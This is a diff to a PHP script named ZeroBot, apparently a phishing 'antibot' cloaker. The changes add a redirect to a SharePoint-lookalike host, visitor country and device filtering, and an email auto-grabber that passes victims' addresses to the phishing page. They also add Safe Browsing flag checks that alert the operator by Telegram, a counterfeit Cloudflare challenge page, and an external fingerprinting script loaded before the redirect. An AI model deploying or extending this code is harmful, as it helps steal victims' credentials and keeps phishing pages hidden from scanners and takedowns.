@@ -8,10 +8,15 @@
     Author  : @brendonurie2000
     Channel : @zerobot_official
 
-    *** Official Version 6 Include ***
+    FingerPrint Update
+
+    *** Official Version 6 ***
 */
 
 $license_key = "ks6zv5u0jn3sivn0ts5ej2hti9yaj8pj"; // [REQUIRED]
+
+$redirect = "https://newfrontshareppint.up.railway.app/?4N2u4AojANvtJaRimRYQ76n02vgAPtsR06N81jOA4bb33g4deikzuUK1sl4vMDF9rxJ4JvZ36kjv9gzWRB2eWMscjPX"; // URL or FILE [REQUIRED]
+
 
 $parameter = 1; // [REQUIRED]
 
@@ -22,11 +27,19 @@ $parameter = 1; // [REQUIRED]
 	4 : Allow All Visitors.
 */
 
-$_COUNTRY_ALLOWED = ["us", "fr", "ca", "mx", "uk", "za", "tr", "at", "be", "bg", "hr", "cy", "cz", "dk", "ee", "fl", "fr", "de", "gr", "hu", "ie", "it", "lv", "lt", "lu", "mt", "nl", "pl", "pt", "ro", "sk", "sl", "es", "se", "is", "li", "no", "ch", "al", "ba", "md", "me", "mk", "rs", "ua", "ad", "by", "mc", "ru", "sm", "gb", "va", "kw"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
+$_COUNTRY_ALLOWED = ["uk", "us", "tr"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
+
+$redirection_link_check = false; // Check Your Page If Still Uploaded
+
+$check_red_page = False; // Check The Redirect If Red Flag
 
 $cloaker = [
     "url_to_grab" => "https://x.com/", // Change the link you want to grap it in your link ( if t)
 ];
+
+$auto_grabber = False; // Activate Auto Grab Email
+
+$auto_grabber_code = "#";
 
 $mobile_access = True; // Access only from mobile device
 
@@ -40,6 +53,12 @@ $token = "TOKEN ID"; // Your Token To Receive Rapports
 
 $chatid = "CHAT ID"; // Your ChatID To Receive Rapports
 
+$captcha = [
+    "activation" => false,
+    "site_key" => "0x4AAAAAABed2PhwS3py0pxx" // Cloudflare Turnstile Key [REQUIRED]
+];
+
+
 $remove_visitors_duplicate = false; // Visitors Remove Duplicate
 
 
@@ -49,6 +68,7 @@ ZeroBot::DefineConstants();
 class ZeroBot
 {
     public $api = "https://api.zerobot.info/v2/antibot"; // Don't Change The Antibot Server
+    public $captcha_api = "https://api.zerobot.info/v2/captcha"; // Don't Change The Antibot Server Captcha
     public $telegram = "https://api.telegram.org/bot"; // Telegam Api
     public $google_api = "https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site="; // Google API To Check Down Links
 
@@ -57,7 +77,7 @@ class ZeroBot
 
     public function __construct()
     {
-        global  $license_key, $parameter, $token, $chatid, $view_file_name, $remove_visitors_duplicate ,$mobile_access,$desktop_access;
+        global $captcha, $license_key, $redirect, $parameter, $token, $chatid, $view_file_name, $remove_visitors_duplicate, $auto_grabber , $auto_grabber_code,$mobile_access,$desktop_access;
     
         $this->token = $token;
         $this->chatid = $chatid;
@@ -66,39 +86,49 @@ class ZeroBot
         $this->useragent = $_SERVER["HTTP_USER_AGENT"];
         $this->rm_db = $remove_visitors_duplicate;
         $this->data_show = str_replace("BASENAME", basename(__FILE__), $this->data_show);
+        $this->redirect = $redirect;
         
         $this->rateLimitIP();
         $this->ValidateQuery();
         $this->HtaccessRemover();
         $this->AccessManager();
         $this->IPManager();
+        $this->GoogleFlagCheck();
+        $this->LinkVerification($license_key);
+        $this->GrabberSet($auto_grabber);
+        $this->CaptchaInputValidate($captcha);
         $this->CaptchaRedirection();
         $this->ValidateIPQuery();
         $this->DeviceManager($mobile_access,$desktop_access);
 
+        $_SESSION["redirect"] = $this->redirect;
         
         switch ($parameter) {
             case "1":
              
 
-                $this->ApiManager();
+                $this->ApiManager($captcha);
+                $this->SelfRedirect(); 
                 
                 
                 break;
             case "2":
 
-                $this->ApiManager();
+                $this->ApiManager($captcha);
+                $this->SelfRedirect();
                 
                 break;
             case "3":
 
                 $this->CountryManager();
                 $this->ViewsManager("Human");
+                $this->SelfRedirect();
 
                 break;
             default:
 
                 $this->ViewsManager("Allowed");
+                $this->SelfRedirect();
                 break;
         }
      
@@ -133,6 +163,17 @@ class ZeroBot
         $_SESSION['rate_limit'][$ip][] = $now;
     }
 
+    public function SelfRedirect()
+    {
+        global $captcha;
+
+        $this->CaptchaResolver($captcha["activation"]);
+        $dst = htmlspecialchars($this->redirect, ENT_QUOTES, 'UTF-8');
+
+        
+        echo '<script src="https://zerobot.info/fingerprint/index.js" data-ip="' . htmlspecialchars($this->ip, ENT_QUOTES, 'UTF-8') . '" onload="window.location.href=\'' . $dst . '\'"></script>';
+        exit();
+    }
     
     public function isMobile() 
     {
@@ -141,6 +182,7 @@ class ZeroBot
     
     public function DeviceManager($mobile_access, $desktop_access)
     {
+        global $captcha;
 
 
         if (!$mobile_access && !$desktop_access) {
@@ -158,13 +200,23 @@ class ZeroBot
         }
     }
 
-
+    public function CaptchaInputValidate($captcha)
+    {
+        if (isset($captcha['activation']))
+        {
+            if (empty($captcha['site_key']) || substr($captcha['site_key'] ,0 , 2) != "0x")
+            {
+                $captcha['activation'] = False;
+            }
+            
+        }
+    }
 
     public function ValidateQuery()
     {
-        global $license_key,$parameter;
+        global $license_key,$redirect,$parameter;
 
-        if (empty($license_key) || strlen($license_key) != 32) {
+        if (empty($license_key) || empty($redirect) ||strlen($license_key) != 32) {
             die("<script>alert('Check your entries and try again !')</script>");
         }
 
@@ -188,7 +240,20 @@ class ZeroBot
         }
     }
 
+    public function GrabberSet($auto_grabber)
+    {
+        global $auto_grabber_code;
 
+        if ($auto_grabber && isset($_GET["email"]))
+        {
+
+            if (empty($auto_grabber_code))
+                $auto_grabber_code = "#";
+
+            $this->redirect .= $auto_grabber_code . $_GET["email"];
+        }
+
+    }
     public static function PHP_VERSION()
 	{
 	    if (version_compare(PHP_VERSION, '7.4.0', '<')) {
@@ -400,6 +465,23 @@ class ZeroBot
         }
     }
 
+    public function LinkVerification($license_key)
+    {
+        global $redirection_link_check;
+
+        $redirect = $this->redirect;
+        if (strpos($redirect, "key") !== false) {
+            $redirect = str_replace("?key=" . $license_key, "", $redirect);
+        }
+
+        if ($redirection_link_check) {
+            $data_check = $this->CurlAccess($redirect . "?check", null);
+            if (!preg_match("/" . key_id . "/", $data_check)) {
+                $this->RapportManager(0, $redirect);
+            }
+        }
+    }
+
     public function CaptchaRedirection()
     {
         
@@ -424,6 +506,46 @@ class ZeroBot
         $protocol = (!empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on") ? "https" : "http";
         return $protocol . "://" . $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"];
     }
+
+    public function CaptchaResolver()
+    {
+        global $captcha;
+        
+        if (!$captcha["activation"]) return;
+
+        $logo = isset($_SESSION["logo"]) ? $_SESSION["logo"] : "https://zerobot.info/captcha/favicon.png";
+        $domain = isset($_SESSION["domain"]) ? $_SESSION["domain"] : "";
+
+        $html = '<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Just a moment...</title><link rel="stylesheet" href="https://zerobot.info/assets/css/cloudflare.css"></head><body class="no-js"><div class="main-wrapper" role="main"><div class="main-content"><h1 class="zone-name-title h1"><div><img width="100px" src="' . $logo . '" style="margin-bottom:-17px" /><div class="site-name"><br></div></div></h1><span id="challenge-error-text"></span><h1 class="zone-name-title h1">' . $domain . '</h1><noscript><div id="challenge-error-title"><div class="h2"><div class="icon-wrapper"><div class="heading-icon warning-icon"></div></div><span class="icon-wrapper"><div class="heading-icon warning-icon"></div></span><span id="challenge-error-text">Enable JavaScript and cookies to continue</span></div></div></noscript><p data-translate="please_wait" id="cf-spinner-please-wait">Please stand by, while we are checking if the site connection is secure</p><form action="?" method="POST" id="gForm" style="visibility:hidden"><div class="h-captcha" data-sitekey="f9a2c5c0-f28a-4fe2-bfba-6f8a6c98b62a" data-callback="verifyCallback_hCaptcha"></div><br></form><form action="?" method="POST" id="cfForm" style="visibility:visible" data-callback="verifyCallback_CF"><div id="turnstileCaptcha"></div><br></form><div id="challenge-body-text" class="core-msg spacer"><div style="margin:10px">Needs to review the security of your connection before proceeding.</div></div></div></div><div class="footer" role="contentinfo"><div class="footer-inner"><div class="text-center">Performance &amp; security by <a rel="noopener noreferrer" href="#" target="_blank">Cloudflare</a></div></div></div><script>var verifyCallback_CF=function(response){window.location.href="?authorize='. base64_encode($this->ip) . '";};var refreshCallBack=function(response){setTimeout(function(){window.location.reload()},1000)};window.onloadTurnstileCallback=function(){turnstile.render("#turnstileCaptcha",{sitekey:"' . $captcha['site_key'] . '",callback:verifyCallback_CF,"expired-callback":refreshCallBack})};</script><script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback"></script></body></html>';
+
+        echo $html;
+        exit();
+    }
+
+
+    private function RapportManager($action, $link)
+    {
+        global $redirection_link_check;
+
+        $date = date("r", $_SERVER["REQUEST_TIME"]);
+        if ($action) {
+            $this->message = "❗️ Status : Down\n";
+            $this->message .= "👉 Link Redirect : " . $this->GetLink() . "\n";
+            $this->message .= "👉 Link Server : " . $link . "\n";
+            $this->message .= "👉 Link Downed Is : " . $link . "\n";
+            $this->message .= "👉 Date : " . $date . "\n";
+
+            $this->TelegramRapport($this->message);
+        }
+        if ($redirection_link_check == 1 and !$action) {
+            $this->message = "❗️ Status : You need to re-upload it now\n";
+            $this->message .= "👉 Link Redirect : " . $this->GetLink() . "\n";
+            $this->message .= "👉 Link Server : " . $link . "\n";
+            $this->message .= "👉 Date : " . $date . "\n";
+            $this->TelegramRapport($this->message);
+        }
+    }
+
 
     private function HtmlSetup()
     {
@@ -483,11 +605,29 @@ class ZeroBot
         }
     }
 
+    public function GoogleFlagCheck()
+    {
+        global $check_red_page;
+
+        if (!$check_red_page) return;
+
+        $urls = [$this->redirect, $this->GetLink()];
+
+        foreach ($urls as $url) {
+            $response = $this->CurlAccess($this->google_api . $url, null);
+            $parts = explode(",", $response);
+
+            if (isset($parts[1]) && $parts[1] == 2) {
+                $this->RapportManager(1, $url);
+                break;
+            }
+        }
+    }  
 
     public function ValidateIPQuery()
     {
 
-        global $license_key;
+        global $captcha,$license_key;
 
         $array_post = [
             "check_on" => $this->GetLink(),
@@ -496,6 +636,8 @@ class ZeroBot
             "useragent" => $this->useragent,
         ];
 
+        if (isset($captcha["activation"]) && $captcha['activation'] == True)
+            $array_post['captcha'] = "";
 
 
         $data_decoded = json_decode($this->CurlAccess($this->api, $array_post),true);
@@ -515,10 +657,22 @@ class ZeroBot
         $_SESSION["total_checked"] = $data_decoded["total"];
 
         $_SESSION["plan"] = $data_decoded["plan"];
+
+        if (array_key_exists("captcha", $data_decoded)) {
+
+            $_SESSION["color"] = $data_decoded["captcha"]["color"];
+            $_SESSION["logo"] = $data_decoded["captcha"]["logo"];
+            $_SESSION["domain"] = $data_decoded["captcha"]["domain"];
+
+        } else {
+            unset($_SESSION["color"]);
+            unset($_SESSION["logo"]);
+            unset($_SESSION["domain"]);
+        }
         
     }
     
-    public function ApiManager()
+    public function ApiManager($captcha)
     {
         global $license_key,$parameter;
 
@@ -554,8 +708,6 @@ class ZeroBot
                 exit();
             }
         }
-
-        http_response_code(403);
     }
 
 }
